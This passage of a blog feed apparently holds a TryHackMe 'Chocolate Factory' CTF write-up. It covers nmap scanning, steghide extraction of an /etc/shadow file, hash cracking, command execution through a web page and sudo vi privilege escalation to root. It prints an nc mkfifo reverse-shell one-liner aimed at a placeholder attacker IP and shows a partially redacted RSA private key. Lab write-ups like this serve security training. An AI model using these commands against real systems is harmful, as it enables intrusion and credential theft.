+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port125-TCP:V=7.80%I=7%D=1/19%Time=60073A7E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20\x20__
+SF:_\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\r\n\x2
+SF:0\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20____\x2
+SF:0___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20_:
+SF:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'\\__\\
+SF:'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x20\\\r\
+SF:n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\x20\x2
+SF:0\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;-----------------`
+SF:\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x20\x20
+SF:\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|_________
+SF:_____________;________________\|\r\n\r\nA\x20small\x20hint\x20from\x20M
+SF:r\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here!\x20;
+SF:\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;)%r(Gener
+SF:icLines,20F,&quot;\&quot;Welcome\x20to\x20chocolate\x20room!!\x20\r\n\x20\x20\x20
+SF:\x20___\x20\x20___\x20\x20___\x20\x20___\x20\x20___\.---------------\.\
+SF:r\n\x20\x20\.'\\__\\'\\__\\'\\__\\'\\__\\'\\__,`\x20\x20\x20\.\x20\x20_
+SF:___\x20___\x20\\\r\n\x20\x20\\\|\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/
+SF:\x20_:\\\x20\x20\|:\.\x20\x20\\\x20\x20\\___\x20\\\r\n\x20\x20\x20\\\\'
+SF:\\__\\'\\__\\'\\__\\'\\__\\'\\_`\.__\|\x20\x20`\.\x20\\\x20\x20\\___\x2
+SF:0\\\r\n\x20\x20\x20\x20\\\\/\x20__\\/\x20__\\/\x20__\\/\x20__\\/\x20__:
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\\\r\n\
+SF:x20\x20\x20\x20\x20\\\\'\\__\\'\\__\\'\\__\\\x20\\__\\'\\_;------------
+SF:-----`\r\n\x20\x20\x20\x20\x20\x20\\\\/\x20\x20\x20\\/\x20\x20\x20\\/\x
+SF:20\x20\x20\\/\x20\x20\x20\\/\x20:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\|\r\n\x20\x20\x20\x20\x20\x20\x20\\\|___
+SF:___________________;________________\|\r\n\r\nA\x20small\x20hint\x20fro
+SF:m\x20Mr\.Wonka\x20:\x20Look\x20somewhere\x20else,\x20its\x20not\x20here
+SF:!\x20;\)\x20\r\nI\x20hope\x20you\x20wont\x20drown\x20Augustus\&quot;\x20&quot;);
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Jan 19 20:05:59 2021 -- 1 IP address (1 host up) scanned in 305.45 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lots of information to go through, what stood out though are most of the ports are displaying the same information which shows:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;small hint from Mr.Wonka : Look somewhere else, its not here! ;)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;However on port 113 I saw:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;http://localhost/key_rev_key &amp;lt;- You will find the key here!!!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Other key notes are FTP allows anonymous log in and web server is available on port 80.&lt;/p&gt;
+
+&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;
+
+&lt;p&gt;I decided to take a look at port 113 first and see what this key was. I used wget to download the file from the server using the url http://10.10.224.249/key_rev_key. Its an ELF file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $file key_rev_key 
+key_rev_key: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8273c8c
+9735121c0a12747aee7ecac1aabaf1f0, not stripped
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I used strings and found:&lt;/p&gt;
+
+&lt;p&gt;Enter your name:&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;laksdhfas&lt;/p&gt;
+
+  &lt;p&gt;congratulations you have found the key:&lt;/p&gt;
+
+  &lt;p&gt;b’-VkgXhFf6sAEcAwrC6YR-SZbiuSb8{REDACTED}’&lt;/p&gt;
+
+  &lt;p&gt;Keep its safe&lt;/p&gt;
+
+  &lt;p&gt;Bad name!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $strings key_rev_key
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+__isoc99_scanf
+puts
+__stack_chk_fail
+printf
+__cxa_finalize
+strcmp
+__libc_start_main
+GLIBC_2.7
+GLIBC_2.4
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+5j
+%l
+%j
+%b
+%Z
+%R
+%J
+%b
+=9
+AWAVI
+AUATL
+[]A\A]A^A_
+Enter your name:
+laksdhfas
+ congratulations you have found the key:
+b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+ Keep its safe
+Bad name!
+;*3$&quot;
+GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+crtstuff.c
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7698
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+license.c
+__FRAME_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+_ITM_deregisterTMCloneTable
+puts@@GLIBC_2.2.5
+_edata
+__stack_chk_fail@@GLIBC_2.4
+printf@@GLIBC_2.2.5
+__libc_start_main@@GLIBC_2.2.5
+__data_start
+strcmp@@GLIBC_2.2.5
+__gmon_start__
+__dso_handle
+_IO_stdin_used
+__libc_csu_init
+__bss_start
+main
+__isoc99_scanf@@GLIBC_2.7
+__TMC_END__
+_ITM_registerTMCloneTable
+__cxa_finalize@@GLIBC_2.2.5
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rela.dyn
+.rela.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.dynamic
+.data
+.bss
+.comment
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I tried to crack the key but no joy, the name was also odd, at this point I decided to enumerate the machine further. Next I looked at FTP, logging in as ‘anonymous’ as the username and password I can only find one file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ftp 10.10.224.249
+Connected to 10.10.224.249.
+220 (vsFTPd 3.0.3)
+Name (10.10.224.249:daz): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; ls -lah
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 65534    65534        4096 Oct 01 12:11 .
+drwxr-xr-x    2 65534    65534        4096 Oct 01 12:11 ..
+-rw-rw-r--    1 1000     1000       208838 Sep 30 14:31 gum_room.jpg
+226 Directory send OK.
+ftp&amp;gt; get gum_room.jpg
+local: gum_room.jpg remote: gum_room.jpg
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for gum_room.jpg (208838 bytes).
+226 Transfer complete.
+208838 bytes received in 0.43 secs (478.6774 kB/s)
+ftp&amp;gt; exit
+221 Goodbye.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The image is of gum!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/chocolatefactory/gum.png&quot; alt=&quot;gum&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;The image doesn’t really help so I decided to check to see if anything was hidden, using steghide I was able to extract a .txt file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $steghide --extract -sf gum_room.jpg
+Enter passphrase: 
+wrote extracted data to &quot;b64.txt&quot;.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As the name imply its base64.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat b64.txt 
+ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
+KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
+MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
+OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
+Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
+d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
+Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
+Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
+LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
+OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
+MzgwOjA6OTk5OTk6Nzo6OgpteXNxbDohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp0c3M6KjoxODM4Mjow
+Ojk5OTk5Ojc6OjoKc2hlbGxpbmFib3g6KjoxODM4MjowOjk5OTk5Ojc6OjoKc3Ryb25nc3dhbjoq
+OjE4MzgyOjA6OTk5OTk6Nzo6OgpudHA6KjoxODM4MjowOjk5OTk5Ojc6OjoKbWVzc2FnZWJ1czoq
+OjE4MzgyOjA6OTk5OTk6Nzo6OgphcnB3YXRjaDohOjE4MzgyOjA6OTk5OTk6Nzo6OgpEZWJpYW4t
+ZXhpbTohOjE4MzgyOjA6OTk5OTk6Nzo6Ogp1dWlkZDoqOjE4MzgyOjA6OTk5OTk6Nzo6OgpkZWJp
+YW4tdG9yOio6MTgzODI6MDo5OTk5OTo3Ojo6CnJlZHNvY2tzOiE6MTgzODI6MDo5OTk5OTo3Ojo6
+CmZyZWVyYWQ6KjoxODM4MjowOjk5OTk5Ojc6OjoKaW9kaW5lOio6MTgzODI6MDo5OTk5OTo3Ojo6
+ ******************************* {REDACTED } *******************************
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Decoding I get the output of a /etc/shadow.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat b64.txt | base64 -d
+daemon:*:18380:0:99999:7:::
+bin:*:18380:0:99999:7:::
+sys:*:18380:0:99999:7:::
+sync:*:18380:0:99999:7:::
+games:*:18380:0:99999:7:::
+man:*:18380:0:99999:7:::
+lp:*:18380:0:99999:7:::
+mail:*:18380:0:99999:7:::
+news:*:18380:0:99999:7:::
+uucp:*:18380:0:99999:7:::
+proxy:*:18380:0:99999:7:::
+www-data:*:18380:0:99999:7:::
+backup:*:18380:0:99999:7:::
+list:*:18380:0:99999:7:::
+irc:*:18380:0:99999:7:::
+gnats:*:18380:0:99999:7:::
+nobody:*:18380:0:99999:7:::
+systemd-timesync:*:18380:0:99999:7:::
+systemd-network:*:18380:0:99999:7:::
+systemd-resolve:*:18380:0:99999:7:::
+_apt:*:18380:0:99999:7:::
+mysql:!:18382:0:99999:7:::
+tss:*:18382:0:99999:7:::
+shellinabox:*:18382:0:99999:7:::
+strongswan:*:18382:0:99999:7:::
+ntp:*:18382:0:99999:7:::
+messagebus:*:18382:0:99999:7:::
+arpwatch:!:18382:0:99999:7:::
+Debian-exim:!:18382:0:99999:7:::
+uuidd:*:18382:0:99999:7:::
+debian-tor:*:18382:0:99999:7:::
+redsocks:!:18382:0:99999:7:::
+freerad:*:18382:0:99999:7:::
+iodine:*:18382:0:99999:7:::
+tcpdump:*:18382:0:99999:7:::
+miredo:*:18382:0:99999:7:::
+dnsmasq:*:18382:0:99999:7:::
+redis:*:18382:0:99999:7:::
+usbmux:*:18382:0:99999:7:::
+rtkit:*:18382:0:99999:7:::
+sshd:*:18382:0:99999:7:::
+postgres:*:18382:0:99999:7:::
+avahi:*:18382:0:99999:7:::
+stunnel4:!:18382:0:99999:7:::
+sslh:!:18382:0:99999:7:::
+nm-openvpn:*:18382:0:99999:7:::
+nm-openconnect:*:18382:0:99999:7:::
+pulse:*:18382:0:99999:7:::
+saned:*:18382:0:99999:7:::
+inetsim:*:18382:0:99999:7:::
+colord:*:18382:0:99999:7:::
+i2psvc:*:18382:0:99999:7:::
+dradis:*:18382:0:99999:7:::
+beef-xss:*:18382:0:99999:7:::
+geoclue:*:18382:0:99999:7:::
+lightdm:*:18382:0:99999:7:::
+king-phisher:*:18382:0:99999:7:::
+systemd-coredump:!!:18396::::::
+_rpc:*:18451:0:99999:7:::
+statd:*:18451:0:99999:7:::
+_gvm:*:18496:0:99999:7:::
+charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Using hashcat I manage to crack the password. However, I’m unable to log in via SSH. Maybe the password has been changed?&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $ssh charlie@10.10.224.249
+charlie@10.10.224.249's password: 
+Permission denied, please try again.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I moved on to port 80 and had a look at the webserver and got a login page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/chocolatefactory/squirrel.png&quot; alt=&quot;squirrel&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried the username Charlie and the cracked password and got in.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/chocolatefactory/command.png&quot; alt=&quot;command&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;
+
+&lt;p&gt;On http://10.10.224.249/home.php I was able to execute any commands, there didnt appear to be any filters. So I started a netcat listener on my VM with the command ‘nc -nvlp 4444’ and used a simple nc revershell shell payload on the web page.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc {Attacker IP} 4444 &amp;gt;/tmp/f&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Straight away I got a shell.&lt;/p&gt;
+
+&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;
+
+&lt;p&gt;I’m on the box but as www-data, I wanted to become the Charlie user. In /home/charlie I found an RSA key. I copied the contents of teleport to my clipboard and pasted in to a file on my attacking VM.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@chocolate-factory:/home/charlie$ cat teleport
+cat teleport
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEA4adrPc3Uh98RYDrZ8CUBDgWLENUybF60lMk9YQOBDR+gpuRW
+1AzL12K35/Mi3Vwtp0NSwmlS7ha4y9sv2kPXv8lFOmLi1FV2hqlQPLw/unnEFwUb
+L4KBqBemIDefV5pxMmCqqguJXIkzklAIXNYhfxLr8cBS/HJoh/7qmLqrDoXNhwYj
+B3zgov7RUtk15Jv11D0Itsyr54pvYhCQgdoorU7l42EZJayIomHKon1jkofd1/oY
+fOBwgz6JOlNH1jFJoyIZg2OmEhnSjUltZ9mSzmQyv3M4AORQo3ZeLb+zbnSJycEE
+RaObPlb0dRy3KoN79lt+dh+jSg/dM/TYYe5L4wIDAQABAoIBAD2TzjQDYyfgu4Ej
+Di32Kx+Ea7qgMy5XebfQYquCpUjLhK+GSBt9knKoQb9OHgmCCgNG3+Klkzfdg3g9
+zAUn1kxDxFx2d6ex2rJMqdSpGkrsx5HwlsaUOoWATpkkFJt3TcSNlITquQVDe4tF
+w8JxvJpMs445CWxSXCwgaCxdZCiF33C0CtVw6zvOdF6MoOimVZf36UkXI2FmdZFl
+kR7MGsagAwRn1moCvQ7lNpYcqDDNf6jKnx5Sk83R5bVAAjV6ktZ9uEN8NItM/ppZ
+j4PM6/IIPw2jQ8WzUoi/JG7aXJnBE4bm53qo2B4oVu3PihZ7tKkLZq3Oclrrkbn2
+EY0ndcECgYEA/29MMD3FEYcMCy+KQfEU2h9manqQmRMDDaBHkajq20KvGvnT1U/T
+RcbPNBaQMoSj6YrVhvgy3xtEdEHHBJO5qnq8TsLaSovQZxDifaGTaLaWgswc0biF
+uAKE2uKcpVCTSewbJyNewwTljhV9mMyn/piAtRlGXkzeyZ9/muZdtesCgYEA4idA
+KuEj2FE7M+MM/+ZeiZvLjKSNbiYYUPuDcsoWYxQCp0q8HmtjyAQizKo6DlXIPCCQ
+RZSvmU1T3nk9MoTgDjkNO1xxbF2N7ihnBkHjOffod+zkNQbvzIDa4Q2owpeHZL19
+znQV98mrRaYDb5YsaEj0YoKfb8xhZJPyEb+v6+kCgYAZwE+vAVsvtCyrqARJN5PB
+ ************************* {REDACTED } *************************
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;With the key, I used chmod to change the permissions (SSH will fail if this is not done) and was able to SSH in to the box as Charlie.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $chmod 600 charlie
+┌─[daz@parrot]─[~/Documents/TryHackMe/Chocolatefactory]
+└──╼ $ssh -i charlie charlie@10.10.224.249
+Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-115-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Jan 19 21:20:23 UTC 2021
+
+  System load:  0.0               Processes:           1207
+  Usage of /:   43.8% of 8.79GB   Users logged in:     0
+  Memory usage: 49%               IP address for eth0: 10.10.224.249
+  Swap usage:   0%
+
+
+0 packages can be updated.
+0 updates are security updates.
+
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Wed Oct  7 16:10:44 2020 from 10.0.2.5
+Could not chdir to home directory /home/charley: No such file or directory
+To run a command as administrator (user &quot;root&quot;), use &quot;sudo &amp;lt;command&amp;gt;&quot;.
+See &quot;man sudo_root&quot; for details.
+
+charlie@chocolate-factory:/$
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;user.txt flag submitted I looked at escalating to root. ‘sudo -l’ shows I can escalate to root using VI, using &lt;a href=&quot;https://gtfobins.github.io/gtfobins/vi/#sudo&quot;&gt;GTFOBins&lt;/a&gt; I manage to get root.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;charlie@chocolate-factory:/$ sudo -l
+Matching Defaults entries for charlie on chocolate-factory:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User charlie may run the following commands on chocolate-factory:
+    (ALL : !root) NOPASSWD: /usr/bin/vi
+charlie@chocolate-factory:/$ 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just when I think I’ve finished I get one more hurdle. When trying to get the root flag I find root.py in its place. I run the script and its asking for a key? I tried ‘test’ just to see what the scipt would do and it responded with: ‘NameError: name ‘test’ is not defined’. When looking at the ELF file, that had a key - ‘VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=’, I entered the key and got ‘SyntaxError: unexpected EOF while parsing’.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@chocolate-factory:/root# python root.py 
+Enter the key:  test
+Traceback (most recent call last):
+  File &quot;root.py&quot;, line 3, in &amp;lt;module&amp;gt;
+    key=input(&quot;Enter the key:  &quot;)
+  File &quot;&amp;lt;string&amp;gt;&quot;, line 1, in &amp;lt;module&amp;gt;
+NameError: name 'test' is not defined
+root@chocolate-factory:/root# python root.py 
+Enter the key:  -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+Traceback (most recent call last):
+  File &quot;root.py&quot;, line 3, in &amp;lt;module&amp;gt;
+    key=input(&quot;Enter the key:  &quot;)
+  File &quot;&amp;lt;string&amp;gt;&quot;, line 1
+    -VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
+                                               ^
+SyntaxError: unexpected EOF while parsing
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Looking at the python script, its a cryptography challenge, I need to enter the key so it can decrypt and provide the output of the variable ‘mess’ which will likley include the flag.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@chocolate-factory:/root# cat root.py
+from cryptography.fernet import Fernet
+import pyfiglet
+key=input(&quot;Enter the key:  &quot;)
+f=Fernet(key)
+encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
+dcrypt_mess=f.decrypt(encrypted_mess)
+mess=dcrypt_mess.decode()
+display1=pyfiglet.figlet_format(&quot;You Are Now The Owner Of &quot;)
+display2=pyfiglet.figlet_format(&quot;Chocolate Factory &quot;)
+print(display1)
+print(display2)
+print(mess)
+root@chocolate-factory:/root# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I decided the quickest way was to remove the input element of the script and just input the key, I copied the script and called it ‘root2.py’.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@chocolate-factory:/root# cat root2.py 
+from cryptography.fernet import Fernet
+import pyfiglet
+key=&quot;-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=&quot;
+f=Fernet(key)
+encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
+dcrypt_mess=f.decrypt(encrypted_mess)
+mess=dcrypt_mess.decode()
+display1=pyfiglet.figlet_format(&quot;You Are Now The Owner Of &quot;)
+display2=pyfiglet.figlet_format(&quot;Chocolate Factory &quot;)
+print(display1)
+print(display2)
+print(mess)
+root@chocolate-factory:/root# 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;That worked and I now have the root flag!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@chocolate-factory:/root# python root2.py 
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                                                             
+  ___                              ___   __  
+ / _ \__      ___ __   ___ _ __   / _ \ / _| 
+| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
+| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
+ \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
+                                             
+
+  ____ _                     _       _       
+ / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
+| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
+| |___| | | | (_) | (_| (_) | | (_| | ||  __/
+ \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
+                                             
+ _____          _                    
+|  ___|_ _  ___| |_ ___  _ __ _   _  
+| |_ / _` |/ __| __/ _ \| '__| | | | 
+|  _| (_| | (__| || (_) | |  | |_| | 
+|_|  \__,_|\___|\__\___/|_|   \__, | 
+                              |___/  
+
+flag{cec59161d338fef787{REDACTED}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><summary type="html"></summary></entry><entry><title type="html">Pickle Rick Write Up</title><link href="https://darrynbrownfield.co.uk/picklerick" rel="alternate" type="text/html" title="Pickle Rick Write Up" /><published>2021-01-06T00:00:00+00:00</published><updated>2021-01-06T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/picklerick</id><content type="html" xml:base="https://darrynbrownfield.co.uk/picklerick">&lt;p&gt;&lt;img src=&quot;/assets/images/picklerick/cover.png&quot; alt=&quot;picklerick&quot; /&gt;&lt;/p&gt;
 
 &lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;
 
